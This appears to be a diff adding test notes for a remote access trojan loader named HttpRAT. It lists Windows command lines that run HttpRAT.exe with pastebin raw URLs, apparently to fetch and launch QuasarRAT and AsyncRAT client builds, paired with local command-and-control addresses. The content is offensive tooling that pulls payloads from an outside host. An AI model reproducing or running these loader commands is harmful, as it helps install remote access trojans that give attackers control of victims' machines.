@@ -1,0 +1,8 @@
+
+
+#Test:
+#QuasarRAT Client-built.exe 127.0.0.1:2019
+  C:\Users\Hades\Desktop>HttpRAT.exe https://pastebin.com/raw/ChfEki2d https://pastebin.com/raw/BF8xncnB https://pastebin.com/raw/wXpCJA9x
+
+#AsyncRAT AsyncClient.exe 192.168.40.1:6606
+  C:\Users\Hades\Desktop\HttpRAT.EXE https://pastebin.com/raw/13m1V6N1 https://pastebin.com/raw/LwZTar3m null
